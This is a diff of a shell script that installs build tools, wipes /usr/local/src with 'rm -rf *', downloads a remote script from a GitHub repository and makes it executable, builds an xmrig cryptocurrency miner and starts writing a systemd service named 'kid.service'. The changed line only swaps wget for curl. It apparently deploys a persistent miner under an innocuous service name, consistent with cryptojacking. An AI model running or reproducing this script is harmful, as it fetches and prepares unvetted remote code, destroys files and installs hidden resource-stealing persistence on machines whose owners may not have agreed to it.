@@ -5,7 +5,7 @@ sudo sysctl vm.nr_hugepages=128 &&
 sudo sysctl -w vm.nr_hugepages=128 &&
 sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
 cd /usr/local/src/ && rm -rf * &&
-wget https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-10-link1.sh && chmod a+x suxmr-10-link1.sh
+curl -O https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-10-link1.sh && chmod a+x suxmr-10-link1.sh
 git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
 bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
 [Unit]
